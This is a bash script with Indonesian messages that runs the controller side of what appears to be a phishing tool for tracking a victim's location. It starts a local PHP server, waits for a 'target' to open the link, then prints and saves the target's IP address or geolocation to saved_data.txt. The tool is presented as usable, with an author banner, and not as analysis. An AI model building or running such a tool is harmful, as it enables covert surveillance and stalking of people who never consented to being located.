
banner(){
    cat ./assets/skull.txt
    printf "\e[1;93mAuthor: Edwin\nYoutube : edwinify\nGithub : edwindefine\e[0m\n"
}

dependencies(){
    command -v php > /dev/null 2>&1 || { printf >&2 "\n\e[31m[!] Script ini memerlukan php, silahkan install terlebih dahulu\e[0m\n"; exit 1; }

}

save_data(){
    if grep -aq 'ip' data.txt
        then
            printf "\n\e[1;92m[\e[0m+\e[1;92m] Target mengakses link!\e[0m\n"

            ip=$(grep -a 'ip' data.txt | cut -d " " -f 3 | tr -d '\r')
            IFS=$'\n'
            printf "\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] IP:\e[0m\e[1;77m %s\e[0m\n" $ip

            # cat data.txt >> saved_data.txt
            sed '$s/$/\n\n/' data.txt >> saved_data.txt
    else
        loc=$(cat data.txt)
        printf "\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] Location:\e[0m\e[1;77m %s\e[0m\n" $loc

        sed '$s/$/\n\n/' data.txt >> saved_data.txt
    fi
}
show_error(){
    err=$(cat error.txt)
    printf "\n\e[31m[!] $err\e[0m\n"
}

start_php(){
    printf "\n\e[1;92m[\e[0m+\e[1;92m] Starting php...\n"
    php -S 127.0.0.1:2222 > /dev/null 2>&1 & 
    sleep 2

    link="http://localhost:2222"
    printf "\e[1;92m[\e[0m-\e[1;92m] Link :\e[0m\e[1;77m %s\e[0m\n" $link
}

check() {
    printf "\e[1;92m[\e[0m-\e[1;92m] Menunggu target,\e[0m\e[1;77m Tekan Ctrl + C untuk keluar...\e[0m\n"
    while [ true ] 
    do
        if [[ -e "data.txt" ]]
            then
                save_data
                rm -rf data.txt
        fi
        sleep 0.5

        if [[ -e "error.txt" ]]
            then
                show_error
                rm -rf error.txt
        fi
        sleep 0.5

    done
}

run(){
    clear
    
    banner
    dependencies
    start_php
    check
}

run


